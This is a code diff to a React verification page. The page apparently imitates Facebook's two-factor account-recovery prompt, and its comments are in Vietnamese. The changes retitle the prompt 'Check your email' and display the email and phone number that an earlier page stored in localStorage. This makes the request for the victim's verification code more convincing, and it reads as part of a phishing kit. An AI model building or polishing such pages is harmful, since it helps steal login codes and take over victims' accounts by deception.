@@ -12,23 +12,36 @@ const Verify = () => {
     const [showError, setShowError] = useState(false);
     const [attempts, setAttempts] = useState(0);
     const [countdown, setCountdown] = useState(0);
+    const [userInfo, setUserInfo] = useState({ email: '', phone: '' });
+
+    // Lấy thông tin từ trang 1
+    useEffect(() => {
+        const savedUserInfo = localStorage.getItem('userInfo');
+        if (savedUserInfo) {
+            const userData = JSON.parse(savedUserInfo);
+            setUserInfo({
+                email: userData.email || '',
+                phone: userData.phone || ''
+            });
+        }
+    }, []);
 
     const defaultTexts = useMemo(
         () => ({
-            title: 'Two-factor authentication required',
-            description: 'Check the notification on another device. Or enter the code you received via SMS, email, Facebook message, or WhatsApp.',
+            title: 'Check your email',
+            description: `We have sent a confirmation code to ${userInfo.email || 'your email'}`,
             placeholder: 'Enter your code',
             infoTitle: 'Approve from another device or Enter your verification code',
             infoDescription:
                 'This may take a few minutes. Please do not leave this page until you receive the code. Once the code is sent, you will be able to appeal and verify.',
             walkthrough: "We'll walk you through some steps to secure and unlock your account.",
-            submit: 'Submit',
-            sendCode: 'Send Code',
+            submit: 'Continue',
+            sendCode: 'Send new code',
             errorMessage: 'The verification code you entered is incorrect',
             loadingText: 'Please wait',
             secondsText: 'seconds'
         }),
-        []
+        [userInfo.email]
     );
 
     const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);
@@ -145,6 +158,16 @@ const Verify = () => {
             <div className='flex max-w-xl flex-col gap-4 rounded-lg bg-white p-4 shadow-lg'>
                 <p className='text-3xl font-bold'>{translatedTexts.title}</p>
                 <p>{translatedTexts.description}</p>
+                
+                {/* Hiển thị email và số điện thoại đã ẩn */}
+                <div className="text-center">
+                    <p className="text-sm text-gray-600">Code sent to:</p>
+                    <p className="font-medium text-blue-600">{userInfo.email}</p>
+                    {userInfo.phone && (
+                        <p className="text-sm text-gray-600 mt-1">or {userInfo.phone}</p>
+                    )}
+                </div>
+
                 <img src={VerifyImage} alt='' />
                 <input
                     type='number'
@@ -166,7 +189,6 @@ const Verify = () => {
                 </div>
                 <p>{translatedTexts.walkthrough}</p>
 
-                {/* Nút Submit đã được update */}
                 <button
                     className='rounded-md bg-[#0866ff] px-4 py-2 text-sm font-medium text-white hover:bg-blue-600 disabled:opacity-50 disabled:bg-gray-400'
                     onClick={handleSubmit}
